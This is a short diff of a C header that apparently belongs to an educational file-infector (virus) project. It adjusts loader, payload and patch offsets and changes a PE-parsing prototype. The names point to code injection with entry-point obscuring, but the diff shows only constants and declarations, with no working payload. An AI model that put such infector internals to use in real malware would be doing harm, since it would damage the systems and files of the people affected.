@@ -21,13 +21,13 @@
 # define BUF_SIZE 0x20
 # define END_SIZE 0x97
 # define LOADER_SIZE 0xCD
-# define PAYLOAD_SIZE 0x29a8 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x290e - FT_MEMCPY_ADDR
+# define PAYLOAD_SIZE 0x2a89 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x29ef - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
-# define OFFSET_1 0x1fc6 - FT_MEMCPY_ADDR
-# define OFFSET_2 0x20ed - FT_MEMCPY_ADDR
-# define OFFSET_3 0x2212 - FT_MEMCPY_ADDR
+# define OFFSET_1 0x208a - FT_MEMCPY_ADDR
+# define OFFSET_2 0x21b1 - FT_MEMCPY_ADDR
+# define OFFSET_3 0x22d6 - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
@@ -74,7 +74,7 @@ void		write_stat(char *buf);
 /*			**** PARSING ****					*/
 int			find_text(t_info *info);
 void		epo_parsing(t_info *info);
-void		pe_parsing(t_info *info);
+int			pe_parsing(t_info *info);
 void		patch_end(t_info *info, int32_t nb);
 int			check_process(char *buf_path);
 
